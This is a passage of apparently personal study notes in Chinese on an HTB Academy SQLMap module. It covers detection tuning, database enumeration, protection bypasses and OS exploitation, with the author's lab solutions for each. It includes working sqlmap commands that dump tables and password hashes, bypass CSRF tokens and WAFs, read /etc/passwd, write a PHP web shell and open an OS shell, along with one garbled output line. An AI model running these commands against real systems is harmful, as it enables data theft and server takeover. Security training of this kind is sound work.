选项–level（1-5，默认为1）根据成功的预期（即，预期越低，级别越高）扩展了所使用的向量和边界。 选项–risk（1-3，默认值1）根据在目标端造成问题的风险（即数据库条目丢失或拒绝服务的风险）扩展所使用的向量集。 对于不同的–level和–risk值，检查使用的边界和有效载荷之间的差异的最佳方法是使用-v选项来设置详细级别。在详细程度3或更高（例如-v 3）中，将显示包含所用[PAYLOAD]的消息</p><h2 id="Advanced-Tuning"><a href="#Advanced-Tuning" class="headerlink" title="Advanced Tuning"></a>Advanced Tuning</h2><h4 id="Status-Codes"><a href="#Status-Codes" class="headerlink" title="Status Codes"></a>Status Codes</h4><p>例如，当处理具有大量动态内容的巨大目标响应时，TRUE和FALSE响应之间的细微差异可以用于检测目的。如果在HTTP代码中可以看到TRUE和FALSE响应之间的差异（例如，TRUE为200，FALSE为500），则选项–code可以用于将TRUE响应的检测固定到特定的HTTP代码（例如–code&#x3D;200）。</p><h4 id="Titles"><a href="#Titles" class="headerlink" title="Titles"></a>Titles</h4><p>如果通过检查HTTP页面标题可以看到响应之间的差异，则开关–title可以用于指示检测机制基于HTML标记<title>的内容进行比较。</p><h4 id="Strings"><a href="#Strings" class="headerlink" title="Strings"></a>Strings</h4><p>如果某个特定字符串值出现在TRUE响应中（例如成功），而在FALSE响应中不存在，则选项–string可用于仅根据该单个值的出现来固定检测（例如–string&#x3D;成功）。</p><h4 id="Text-only"><a href="#Text-only" class="headerlink" title="Text-only"></a>Text-only</h4><p>当处理许多隐藏的内容时，例如某些HTML页面行为标签（例如＜script＞、＜style＞、＜meta＞等），我们可以使用–text only开关，它删除所有HTML标签，并仅基于文本（即可见）内容进行比较。</p><h4 id="Techniques"><a href="#Techniques" class="headerlink" title="Techniques"></a>Techniques</h4><p>在某些特殊情况下，我们不得不将使用的有效载荷缩小到特定类型。例如，如果基于时间的盲有效载荷以响应超时的形式引起了麻烦，或者如果我们想强制使用特定的SQLi有效载荷类型，选项-技术可以指定要使用的SQLi技术。 例如，如果我们想跳过基于时间的盲和堆叠SQLi有效载荷，只测试基于布尔的盲、基于错误和UNION查询有效载荷，我们可以使用–technique&#x3D;BEU指定这些技术。</p><h4 id="UNION-SQLi-Tuning"><a href="#UNION-SQLi-Tuning" class="headerlink" title="UNION SQLi Tuning"></a>UNION SQLi Tuning</h4><p>在某些情况下，UNIONSQLi有效负载需要额外的用户提供的信息才能工作。如果我们可以手动找到易受攻击的SQL查询的确切列数，我们可以通过选项–union cols（例如–union cols&#x3D;17）将这个数字提供给SQLMap。如果SQLMap使用的默认“伪”填充值（NULL和随机整数）与易受攻击的SQL查询结果中的值不兼容，我们可以指定一个替代值（例如–union char&#x3D;’a’）。 此外，如果需要在UNION查询的末尾以FROM＜table＞的形式使用附录（例如，在Oracle的情况下），我们可以使用选项–UNION-FROM（例如–UNION-FROM&#x3D;users）来设置它。 未能自动使用正确的FROM附录可能是由于无法在使用前检测DBMS名称。</p><h2 id="practice-1"><a href="#practice-1" class="headerlink" title="practice"></a>practice</h2><p><strong>What’s the contents of table flag5? (Case #5 OR SQLi)</strong></p><pre><code>sqlmap -u http://94.237.62.6:33702/case5.php?id=1  -D testdb -T flag5 --dump --risk=3 --level=5 --batch</code></pre><p>强度不够用到的技术回显所有测试都无法注入，把强度提到最高</p><p>但是这里要增加一个<code>--no-cast</code>来禁用类型转换，不然可能得到不准确的结果</p><blockquote><p>在sqlmap中，<code>--no-cast</code> 选项用于禁用类型转换。类型转换是sqlmap在进行注入测试时尝试将数据转换为不同类型的一种技术。</p><p>当执行注入测试时，sqlmap会尝试通过将注入数据转换为不同类型来绕过目标网站的防御机制。这包括将字符串转换为数字、布尔值等。这种类型转换可以帮助sqlmap绕过一些简单的过滤或防御措施，以发现更深入的注入漏洞。</p><p>然而，在某些情况下，类型转换可能导致误报或产生不准确的结果。如果您希望禁用类型转换，可以使用 <code>--no-cast</code> 选项。通过使用该选项，sqlmap将不会尝试进行任何类型转换，而是将数据保持原始的注入形式。</p><p>以下是使用 <code>--no-cast</code> 选项的示例命令：</p><pre><code class="shell">sqlmap -u &lt;目标URL&gt; --no-cast</code></pre><p>请注意，禁用类型转换可能会限制sqlmap的能力来绕过某些防御机制。使用 <code>--no-cast</code> 选项时，需要仔细评估目标系统的情况，并确保测试的结果准确性和完整性。在进行任何安全测试时，请确保您已经获得适当的授权，并遵守法律和道德准则。</p></blockquote><p><strong>What’s the contents of table flag6? (Case #6 Non-standard boundaries)</strong></p><pre><code>sqlmap -u http://94.237.59.206:49992/case6.php?col=id  --batch --dump --prefix &#39;`)&#39; -D testdb -T flag6</code></pre><p> <strong>What’s the contents of table flag7? (Case #7 with adjustments)</strong></p><blockquote><p>Detect and exploit SQLi vulnerability in GET parameter <code>id</code> by usage of UNION query-based technique</p></blockquote><pre><code class="\">sqlmap -u http://94.237.59.206:49992/case7.php?id=1  --batch --dump -D testdb -T flag7 --union-cols=5</code></pre><h1 id="Database-Enumeration"><a href="#Database-Enumeration" class="headerlink" title="Database Enumeration"></a>Database Enumeration</h1><p>通常，在成功检测到SQLi漏洞后，我们可以开始枚举数据库中的基本细节，例如易受攻击目标的主机名（–hostname）、当前用户名（–current-user）、当前数据库名称（–current-db）或密码散列（–passwords）。SQLMap将跳过SQLi检测，如果它已经被早期识别，并直接启动DBMS枚举过程。 枚举通常从检索基本信息开始：</p><ul><li>数据库版本（switch <code>--banner</code>） </li><li>当前用户名（switch –current-user） </li><li>当前数据库名称（开关–current-db） </li><li>正在检查当前用户是否具有DBA（administrator）权限。</li></ul><p> 以下SQLMap命令可执行上述所有操作：</p><pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.example.com/?id=1&quot; --banner --current-user --current-db --is-dba</code></pre><blockquote><p>注：在绝大多数情况下，数据库上下文中的“root”用户与操作系统用户“root”没有任何关系，而不是代表DBMS上下文中的特权用户。这基本上意味着数据库用户在数据库上下文中不应该有任何约束，而操作系统权限（例如，文件系统写入任意位置）应该是最小化的，至少在最近的部署中是这样。同样的原则也适用于一般的“DBA”角色。</p></blockquote><h2 id="Table-Enumeration"><a href="#Table-Enumeration" class="headerlink" title="Table Enumeration"></a>Table Enumeration</h2><p>在大多数常见的场景中，在找到当前数据库名称（即testdb）后，将通过使用–tables选项并使用-D testdb指定数据库名称来检索表名，如下所示：</p><pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.example.com/?id=1&quot; --tables -D testdb</code></pre><p>在发现感兴趣的表名后，可以通过使用–dump选项并使用-T用户指定表名来检索其内容，如下所示：</p><pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.example.com/?id=1&quot; --dump -T users -D testdb</code></pre><p>可以通过选项“–dump format”将输出格式指定为HTML或SQLite，这样我们以后就可以在SQLite环境中进一步研究DB了。</p><h2 id="Table-x2F-Row-Enumeration"><a href="#Table-x2F-Row-Enumeration" class="headerlink" title="Table&#x2F;Row Enumeration"></a>Table&#x2F;Row Enumeration</h2><p>当处理具有许多列和&#x2F;或行的大型表时，我们可以使用-C选项指定列（例如，仅名称和姓氏列），如下所示：</p><pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.example.com/?id=1&quot; --dump -T users -D testdb -C name,surname</code></pre><p>要根据表中的序号缩小行的范围，我们可以使用–start和–stop选项指定行（例如，从第二个条目开始到第三个条目），如下所示：</p><pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.example.com/?id=1&quot; --dump -T users -D testdb --start=2 --stop=3</code></pre><h2 id="Conditional-Enumeration"><a href="#Conditional-Enumeration" class="headerlink" title="Conditional Enumeration"></a>Conditional Enumeration</h2><p>如果需要根据已知的WHERE条件检索某些行（例如name LIKE“f%”），我们可以使用选项–WHERE，如下所示：</p><pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.example.com/?id=1&quot; --dump -T users -D testdb --where=&quot;name LIKE &#39;f%&#39;&quot;</code></pre><h2 id="Full-DB-Enumeration"><a href="#Full-DB-Enumeration" class="headerlink" title="Full DB Enumeration"></a>Full DB Enumeration</h2><p>我们可以通过完全跳过选项-T（例如-dump-D testdb）的使用来检索感兴趣的数据库中的所有表，而不是基于单个表检索内容。只需使用开关-dump而不指定带-T的表，就可以检索到所有当前的数据库内容。至于–dump-all开关，将检索所有数据库中的所有内容。 在这种情况下，还建议用户包括开关-exclude sysdbs（例如-dump-all-exclude sysdb），这将指示SQLMap跳过从系统数据库中检索内容，因为它通常对Pentester不太感兴趣。</p><h2 id="practice-2"><a href="#practice-2" class="headerlink" title="practice"></a>practice</h2><p> <strong>What’s the contents of table flag1 in the testdb database? (Case #1)</strong></p><pre><code>sqlmap -u http://94.237.59.206:49992/case1.php?id=1  --batch --dump -D testdb -T flag1 </code></pre><h1 id="Advanced-Database-Enumeration"><a href="#Advanced-Database-Enumeration" class="headerlink" title="Advanced Database Enumeration"></a>Advanced Database Enumeration</h1><h2 id="DB-Schema-Enumeration"><a href="#DB-Schema-Enumeration" class="headerlink" title="DB Schema Enumeration"></a>DB Schema Enumeration</h2><p>如果我们想检索所有表的结构，以便对数据库体系结构有一个完整的概述，我们可以使用switch –schema：</p><pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.example.com/?id=1&quot; --schema</code></pre><h2 id="Searching-for-Data"><a href="#Searching-for-Data" class="headerlink" title="Searching for Data"></a>Searching for Data</h2><p>当处理具有大量表和列的复杂数据库结构时，我们可以使用–search选项搜索感兴趣的数据库、表和列。此选项使我们能够使用LIKE运算符搜索标识符名称。例如，如果我们正在查找包含关键字user的所有表名，我们可以按如下方式运行SQLMap：</p><pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.example.com/?id=1&quot; --search -T user</code></pre><p>在上面的例子中，我们可以根据这些搜索结果立即发现几个有趣的数据检索目标。我们还可以尝试根据特定关键字搜索所有列名（例如pass）：</p><pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.example.com/?id=1&quot; --search -C pass</code></pre><h2 id="Password-Enumeration-and-Cracking"><a href="#Password-Enumeration-and-Cracking" class="headerlink" title="Password Enumeration and Cracking"></a>Password Enumeration and Cracking</h2><p>一旦我们识别出一个包含密码的表（例如master.users），我们就可以使用-T选项检索该表，如前所示：</p><pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.example.com/?id=1&quot; --dump -D master -T users</code></pre><h2 id="DB-Users-Password-Enumeration-and-Cracking"><a href="#DB-Users-Password-Enumeration-and-Cracking" class="headerlink" title="DB Users Password Enumeration and Cracking"></a>DB Users Password Enumeration and Cracking</h2><p>除了在数据库表中找到的用户凭据之外，我们还可以尝试转储包含数据库特定凭据（例如，连接凭据）的系统表的内容。为了简化整个过程，SQLMap有一个特殊的开关——专门为这样的任务设计的–passwords：</p><pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.example.com/?id=1&quot; --passwords --batch</code></pre><h2 id="practice-3"><a href="#practice-3" class="headerlink" title="practice"></a>practice</h2><p><strong>What’s the name of the column containing “style” in it’s name? (Case #1)</strong></p><pre><code>sqlmap -u http://94.237.59.206:49992/case1.php?id=1  --search -C style </code></pre><p><strong>What’s the Kimberly user’s password? (Case #1)</strong></p><pre><code>sqlmap -u http://94.237.59.206:49992/case1.php?id=1  -D testdb -T users -C name,password --dump</code></pre><p>这里我想着用–where或者–search，但是发现好像搞不了。。。</p><h1 id="Bypassing-Web-Application-Protections"><a href="#Bypassing-Web-Application-Protections" class="headerlink" title="Bypassing Web Application Protections"></a>Bypassing Web Application Protections</h1><h2 id="Anti-CSRF-Token-Bypass"><a href="#Anti-CSRF-Token-Bypass" class="headerlink" title="Anti-CSRF Token Bypass"></a>Anti-CSRF Token Bypass</h2><p>防止使用自动化工具的第一道防线是将反CSRF（即跨站点请求伪造）令牌合并到所有HTTP请求中，尤其是那些由于web表单填写而生成的请求。 在最基本的术语中，只有当用户实际访问并使用了页面时，这种场景中的每个HTTP请求才应该有一个（有效的）令牌值。虽然最初的想法是防止出现恶意链接的情况，在这种情况下，仅仅打开这些链接就会对不知情的登录用户产生不希望的后果（例如，打开管理员页面并添加具有预定义凭据的新用户），但这一安全功能也无意中强化了应用程序以抵御（不希望的）自动化。 尽管如此，SQLMap有一些选项可以帮助绕过反CSRF保护。也就是说，最重要的选项是–csrf-token。通过指定令牌参数名称（在提供的请求数据中应该已经可用），SQLMap将自动尝试解析目标响应内容并搜索新的令牌值，以便在下一个请求中使用它们。 此外，即使在用户没有通过–csrf-token明确指定令牌名称的情况下，如果提供的参数之一包含任何常见的中缀（即csrf、xsrf、token），用户也会在进一步的请求中被提示是否更新它：</p><pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.example.com/&quot; --data=&quot;id=1&amp;csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE&quot; --csrf-token=&quot;csrf-token&quot;</code></pre><h2 id="Unique-Value-Bypass"><a href="#Unique-Value-Bypass" class="headerlink" title="Unique Value Bypass"></a>Unique Value Bypass</h2><p>在某些情况下，web应用程序可能只需要在预定义的参数内提供唯一的值。这种机制类似于上述的反CSRF技术，不同之处在于不需要解析网页内容。因此，通过简单地确保每个请求都有一个预定义参数的唯一值，web应用程序可以很容易地阻止CSRF尝试，同时避免一些自动化工具。为此，应使用选项–randomize，指向包含在发送之前应随机化的值的参数名称：</p><pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.example.com/?id=1&amp;rp=29125&quot; --randomize=rp --batch -v 5 | grep URIURI: http://www.example.com:80/?id=1&amp;rp=99954URI: http://www.example.com:80/?id=1&amp;rp=87216URI: http://www.example.com:80/?id=9030&amp;rp=36456URI: http://www.example.com:80/?id=1.%2C%29%29%27.%28%28%2C%22&amp;rp=16689URI: http://www.example.com:80/?id=1%27xaFUVK%3C%27%22%3EHKtQrg&amp;rp=40049URI: http://www.example.com:80/?id=1%29%20AND%209368%3D6381%20AND%20%287422%3D7422&amp;rp=95185</code></pre><h2 id="Calculated-Parameter-Bypass"><a href="#Calculated-Parameter-Bypass" class="headerlink" title="Calculated Parameter Bypass"></a>Calculated Parameter Bypass</h2><p>另一种类似的机制是web应用程序期望基于一些其他参数值来计算适当的参数值。通常情况下，一个参数值必须包含另一个参数的消息摘要（例如h&#x3D;MD5（id））。要绕过这一点，应该使用–eval选项，其中在将请求发送到目标之前对有效的Python代码进行评估：</p><pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.example.com/?id=1&amp;h=c4ca4238a0b923820dcc509a6f75849b&quot; --eval=&quot;import hashlib; h=hashlib.md5(id).hexdigest()&quot; --batch -v 5 | grep URIURI: http://www.example.com:80/?id=1&amp;h=c4ca4238a0b923820dcc509a6f75849bURI: http://www.example.com:80/?id=1&amp;h=c4ca4238a0b923820dcc509a6f75849bURI: http://www.example.com:80/?id=9061&amp;h=4d7e0d72898ae7ea3593eb5ebf20c744URI: http://www.example.com:80/?id=1%2C.%2C%27%22.%2C%28.%29&amp;h=620460a56536e2d32fb2f4842ad5a08dURI: http://www.example.com:80/?id=1%27MyipGP%3C%27%22%3EibjjSu&amp;h=db7c815825b14d67aaa32da09b8b2d42URI: http://www.example.com:80/?id=1%29%20AND%209978%socks4://177.39.187.70:33283ssocks4://177.39.187.70:332833D1232%20AND%20%284955%3D4955&amp;h=02312acd4ebe69e2528382dfff7fc5cc</code></pre><h2 id="IP-Address-Concealing"><a href="#IP-Address-Concealing" class="headerlink" title="IP Address Concealing"></a>IP Address Concealing</h2><p>如果我们想隐藏我们的IP地址，或者某个网络应用程序有将我们当前的IP地址列入黑名单的保护机制，我们可以尝试使用代理或匿名网络Tor。可以使用选项–proxy设置代理（例如–proxy&#x3D;“socks4:&#x2F;&#x2F;177.39.187.70:33283”），我们应该在其中添加一个工作代理。 除此之外，如果我们有一个代理列表，我们可以通过选项–proxy-file将它们提供给SQLMap。这样，SQLMap将按顺序遍历列表，如果出现任何问题（例如，IP地址被列入黑名单），它将从列表中从当前跳到下一个。另一种选择是使用Tor网络来提供易于使用的匿名化，我们的IP可以出现在Tor出口节点的大列表中的任何位置。在本地计算机上正确安装后，本地端口9050或9150上应该有SOCKS4代理服务。通过使用开关–tor，SQLMap将自动尝试查找本地端口并适当地使用它。 如果我们想确保Tor被正确使用，以防止不必要的行为，我们可以使用开关——check Tor。在这种情况下，SQLMap将连接到<a href="https://check.torproject.org/%E5%B9%B6%E6%A3%80%E6%9F%A5%E5%93%8D%E5%BA%94%E7%9A%84%E9%A2%84%E6%9C%9F%E7%BB%93%E6%9E%9C%EF%BC%88%E5%8D%B3%EF%BC%8C%E7%A5%9D%E8%B4%BA%E5%87%BA%E7%8E%B0%E5%9C%A8%E9%87%8C%E9%9D%A2%EF%BC%89%E3%80%82">https://check.torproject.org/并检查响应的预期结果（即，祝贺出现在里面）。</a></p><h2 id="WAF-Bypass"><a href="#WAF-Bypass" class="headerlink" title="WAF Bypass"></a>WAF Bypass</h2><p>每当我们运行SQLMap时，作为初始测试的一部分，SQLMap都会使用不存在的参数名称（例如？pfov&#x3D;…）发送一个预定义的恶意负载，以测试WAF（Web应用程序防火墙）的存在。在用户和目标之间存在任何保护的情况下，与原始响应相比，响应将发生实质性变化。例如，如果实现了最流行的WAF解决方案之一（ModSecurity），那么在这样的请求之后应该会有一个406-不可接受的响应。为了识别实际的保护机制，SQLMap使用第三方库 <a href="https://github.com/stamparm/identYwaf">identYwaf</a>，其中包含80种不同WAF解决方案的签名。如果我们想完全跳过这个启发式测试（即，产生更少的噪声），我们可以使用switch –skip-waf。</p><h2 id="User-agent-Blacklisting-Bypass"><a href="#User-agent-Blacklisting-Bypass" class="headerlink" title="User-agent Blacklisting Bypass"></a>User-agent Blacklisting Bypass</h2><p>如果在运行SQLMap时出现即时问题（例如，从一开始就出现HTTP错误代码5XX），我们首先应该考虑的是SQLMap使用的默认用户代理（例如，用户代理：SQLMap&#x2F;1.4.9(<a href="http://sqlmap.org))./">http://sqlmap.org))。</a> 使用开关-随机代理绕过这一点很简单，它使用从浏览器使用的大量值中随机选择的值来更改默认用户代理。</p><blockquote><p>注意：如果在运行过程中检测到某种形式的保护，我们可能会发现目标出现问题，甚至其他安全机制也会出现问题。主要原因是这种保护的不断发展和新的改进，给攻击者留下了越来越小的机动空间。</p></blockquote><h2 id="Tamper-Scripts"><a href="#Tamper-Scripts" class="headerlink" title="Tamper Scripts"></a>Tamper Scripts</h2><p>最后，在SQLMap中实现的绕过WAF&#x2F;IPS解决方案的最流行的机制之一是所谓的“篡改”脚本。篡改脚本是一种特殊的（Python）脚本，用于在将请求发送到目标之前修改请求，在大多数情况下是为了绕过一些保护。 例如，之间最流行的篡改脚本之一是将所有出现的大于运算符（&gt;）替换为NOT between 0 AND#，将等于运算符（&#x3D;）替换为between#AND#。通过这种方式，许多基本的保护机制（主要集中在防止XSS攻击）很容易被绕过，至少对于SQLi来说是这样。 篡改脚本可以一个接一个地链接在–Tamper选项中（例如–Tamper&#x3D;between，randomcase），在那里它们根据预定义的优先级运行。优先级是预先定义的，以防止任何不需要的行为，因为一些脚本通过修改其SQL语法来修改有效负载（例如ifnull2ifisull）。相反，一些篡改脚本并不关心内部内容（例如appendnullbyte）。 篡改脚本可以修改请求的任何部分，尽管大多数都会更改负载内容。</p><p>为了获得实现的篡改脚本的完整列表，以及上面的描述，可以使用 <code>--list-tampers</code> 。我们还可以为任何自定义类型的攻击开发自定义篡改脚本，比如二阶SQLi。</p><h2 id="Miscellaneous-Bypasses"><a href="#Miscellaneous-Bypasses" class="headerlink" title="Miscellaneous Bypasses"></a>Miscellaneous Bypasses</h2><p>在其他保护旁路机制中，还有两个机制需要提及。第一个是Chunked传输编码，使用开关Chunked打开，它将POST请求的主体拆分为所谓的“chunk”。列入黑名单的SQL关键字在chunk之间进行拆分，这样包含它们的请求就可以被忽略。 另一种绕过机制是HTTP参数污染（HPP），其中有效载荷以与情况类似的方式进行拆分——在不同的相同参数命名值之间分块（例如<code>？id=1&amp;id=UNION&amp;id=SELECT&amp;id=username，password&amp;id=FROM&amp;id=users…</code>），如果支持，则由目标平台连接（例如ASP）。</p><h2 id="practice-4"><a href="#practice-4" class="headerlink" title="practice"></a>practice</h2><p><strong>What’s the contents of table flag8? (Case #8 anti-CSRF token bypass)</strong></p><pre><code>sqlmap -u http://94.237.59.206:37390/case8.php --method POST --data &quot;id=1&amp;t0ken=2W13oyiefGY3lbZnUMqJytlCObM4kGlfTzigcsr50&quot; --csrf-token=&quot;t0ken&quot; --cookie=&quot;PHPSESSID=cv17jl24lbh9ohmg70nsm48t4v&quot; -D testdb -T flag8 --dump</code></pre><p>需要去查看相关的负载和cookie</p><p><strong>What’s the contents of table flag9? (Case #9 What’s the contents of table flag9? (Case #9))</strong></p><pre><code>sqlmap -u &#39;http://94.237.60.119:58978/case9.php?id=1&amp;uid=753674357&#39; --randomize=&quot;uid&quot; -D testdb -T flag9 --dump</code></pre><p><strong>What’s the contents of table flag10? (Case #10-Primitive protection )</strong></p><p>这里正常payload一跑就出错，可能是用户代理有问题，根据报错提示加了一个<code>--random-agent</code>:</p><pre><code>sqlmap -u &#39;http://94.237.60.119:58978/case10.php&#39; --method POST --data &quot;id=1&quot; -D testdb -T flag10 --dump --random-agent</code></pre><p>这里其实把包写在文档中使用<code>-r</code>也可以直接注入</p><p> <strong>What’s the contents of table flag11? (Case #11 Filtering of characters ‘&lt;’, ‘&gt;’)</strong></p><p>着里按照题目提示会过滤两个符号，应该要用到Tamper脚本，先使用<code>--list-tampers</code>查找一下</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307141924212.png" alt="image-20230714192407146"></p><p>应该只能是这个脚本了，虽然根据描述它没有修改‘&lt;’</p><pre><code>sqlmap -u http://94.237.60.119:58978/case11.php?id=1 -D testdb -T flag11 --tamper=between --dump</code></pre><h1 id="OS-Exploitation"><a href="#OS-Exploitation" class="headerlink" title="OS Exploitation"></a>OS Exploitation</h1><p>SQLMap能够利用SQL注入从DBMS外部的本地系统读取和写入文件。如果我们有适当的权限，SQLMap还可以尝试在远程主机上直接执行命令。</p><h2 id="File-Read-x2F-Write"><a href="#File-Read-x2F-Write" class="headerlink" title="File Read&#x2F;Write"></a>File Read&#x2F;Write</h2><p>通过SQL注入漏洞进行操作系统攻击的第一部分是在托管服务器上读取和写入数据。读取数据比写入数据要常见得多，写入数据在现代数据库管理系统中具有严格的特权，因为它可能会导致系统利用，正如我们将看到的那样。例如，在MySql中，要读取本地文件，DB用户必须具有LOAD DATA和INSERT的权限，才能将文件的内容加载到表中，然后读取该表。 此类命令的一个示例是：</p><ul><li><code>LOAD DATA LOCAL INFILE &#39;/etc/passwd&#39; INTO TABLE passwd;</code></li></ul><h2 id="Checking-for-DBA-Privileges"><a href="#Checking-for-DBA-Privileges" class="headerlink" title="Checking for DBA Privileges"></a>Checking for DBA Privileges</h2><p>要检查我们是否具有SQLMap的DBA权限，我们可以使用–is-DBA选项：</p><pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.example.com/case1.php?id=1&quot; --is-dba...SNIP...current user is DBA: False</code></pre><h2 id="Reading-Local-Files"><a href="#Reading-Local-Files" class="headerlink" title="Reading Local Files"></a>Reading Local Files</h2><p>与通过SQLi手动注入上述行不同，SQLMap使用–file read选项使读取本地文件变得相对容易：</p><pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.example.com/?id=1&quot; --file-read &quot;/etc/passwd&quot;...SNIP...[17:40:14] [INFO] the local file &#39;~/.sqlmap/output/www.example.com/files/_etc_passwd&#39; and the remote file &#39;/etc/passwd&#39; have the same size (982 B)files saved to [1]:[*] ~/.sqlmap/output/www.example.com/files/_etc_passwd (same file)</code></pre><p>正如我们所看到的，SQLMap说文件保存到本地文件。我们可以对本地文件进行cat以查看其内容</p><h2 id="Writing-Local-Files"><a href="#Writing-Local-Files" class="headerlink" title="Writing Local Files"></a>Writing Local Files</h2><p>当它向托管服务器写入文件时，在现代DMBS中变得更加受限，因为我们可以利用它在远程服务器上编写Web Shell，从而执行代码并接管服务器。 这就是为什么现代DBMS默认情况下禁用文件写入，并且需要DBA的某些权限才能写入文件。例如，在MySql中，必须手动禁用–secure file priv配置，以允许使用into OUTFILE SQL查询将数据写入本地文件，此外还需要主机服务器上的任何本地访问权限，如在我们需要的目录中写入的权限。 尽管如此，许多web应用程序都要求DBMS能够将数据写入文件，因此值得测试我们是否可以将文件写入远程服务器。要使用SQLMap做到这一点，我们可以使用–file write和–file dest选项。首先，让我们准备一个基本的PHP web shell，并将其写入shell.PHP文件.</p><p>现在，让我们尝试在远程服务器上的&#x2F;var&#x2F;www&#x2F;html&#x2F;目录中编写此文件，该目录是Apache的默认服务器webroot。如果我们不知道服务器webroot，我们将看到SQLMap如何自动找到它。</p><pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.example.com/?id=1&quot; --file-write &quot;shell.php&quot; --file-dest &quot;/var/www/html/shell.php&quot;</code></pre><h2 id="OS-Command-Execution"><a href="#OS-Command-Execution" class="headerlink" title="OS Command Execution"></a>OS Command Execution</h2><p>现在我们确认了我们可以编写一个PHP shell来执行命令，我们可以测试SQLMap的能力，它可以为我们提供一个简单的操作系统shell，而无需手动编写远程shell。SQLMap利用各种技术通过SQL注入漏洞获取远程shell，比如像我们刚才所做的那样编写远程shell，编写执行命令和检索输出的SQL函数，甚至使用一些直接执行OS命令的SQL查询，比如Microsoft SQL Server中的xp_cmdshell。要获得带有SQLMap的操作系统外壳，我们可以使用–OS-shell选项，如下所示：</p><pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.example.com/?id=1&quot; --os-shell...SNIP...[18:02:37] [INFO] the local file &#39;/tmp/sqlmapmswx18kp12261/lib_mysqludf_sys8kj7u1jp.so&#39; and the remote file &#39;./libslpjs.so&#39; have the same size (8040 B)[18:02:37] [INFO] creating UDF &#39;sys_exec&#39; from the binary UDF file[18:02:38] [INFO] creating UDF &#39;sys_eval&#39; from the binary UDF file[18:02:39] [INFO] going to use injected user-defined functions &#39;sys_eval&#39; and &#39;sys_exec&#39; for operating system command execution[18:02:39] [INFO] calling Linux OS shell. To quit type &#39;x&#39; or &#39;q&#39; and press ENTERos-shell&gt; ls -lado you want to retrieve the command standard output? [Y/n/a] a[18:02:45] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION techniqueNo output</code></pre><p>我们看到SQLMap默认使用UNION技术来获得操作系统外壳，但最终未能给我们任何输出No output。因此，正如我们已经知道的那样，我们有多种类型的SQL注入漏洞，让我们尝试指定另一种更有可能为我们提供直接输出的技术，如基于错误的SQL注入，我们可以用–technique&#x3D;E指定它：</p><pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.example.com/?id=1&quot; --os-shell --technique=E</code></pre><h2 id="practice-5"><a href="#practice-5" class="headerlink" title="practice"></a>practice</h2><p><strong>Try to use SQLMap to read the file “&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.txt”.</strong></p><pre><code>sqlmap -u http://94.237.50.62:39989/?id=1 --file-read &quot;/var/www/html/flag.txt&quot;</code></pre><p>（既然要拿到shell那么这一步好像没啥必要）</p><p><strong>Use SQLMap to get an interactive OS shell on the remote host and try to find another flag within the host.</strong></p><pre><code>sqlmap -u http://94.237.50.62:39989/?id=1 --os-shell</code></pre><p>这里加一个<code>--technique=E</code>应该能够更加丝滑地拿到shell；拿到shell之后目录是锁定的，只能find检索一下flag位置然后直接读取</p><h1 id="Skills-Assessment"><a href="#Skills-Assessment" class="headerlink" title="Skills Assessment"></a>Skills Assessment</h1><p>您可以访问具有基本保护机制的web应用程序。使用本模块中学习的技能，通过SQLMap查找SQLi漏洞并进行相应的攻击。要完成此模块，请找到标志并在此处提交。</p><blockquote><p>target:83.136.253.168:50653</p><p>What’s the contents of table final_flag?</p></blockquote><p>在网页上浏览，在blog目录中看到了一个查询接口，本章讲的是sqli那么漏洞应该就是这里了（有点取巧了bushi），但是发现没什么反应乌鱼子只能找找其他地方</p><p>突然发现有一个POST包，应该是点击加入购物车触发的，它发送了一个json文件</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307142024688.png" alt="image-20230714202432615"></p><p>用这个包打打看，先直接看看能不能拿到shell</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307142035598.png" alt="image-20230714203535534"></p><p>这里显示有防火墙或者一些过滤规则，让程序接着跑一会，再开一个窗口试试常规的数据库检索，万一flag在数据库里呢？</p><p>但是发现一样的卡住了，这里怎么说呢，还是只能取巧试一试之前的绕过方式，在之前的文档中用到的tamper这里也拥有一下（一般而言这个模块是这样的）……然后就好家伙，用between报错了没了hh~</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307151001412.png" alt="image-20230715100131257">回显上两次提到了time-base，可以设定注入技术为T（technique&#x3D;T)，因为在mysql里拿到了库名，可以直接指定dbms&#x3D;Mysql</p><p>最终的payload长这样：</p><pre><code>sqlmap -r test.txt -D production -T final_flag --tamper=between --dbms=Mysql --technique=T --dump --no-cast</code></pre><p>如果不加–no-cast或者–hex可能回显blank：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307151019524.png" alt="image-20230715101944473"></p><p>使用–no-cast后拿到flag：</p><p>这里补充一下为什么会用到tamper&#x3D;between</p><p>先正常-r</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307151010044.png"></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307151011530.png" 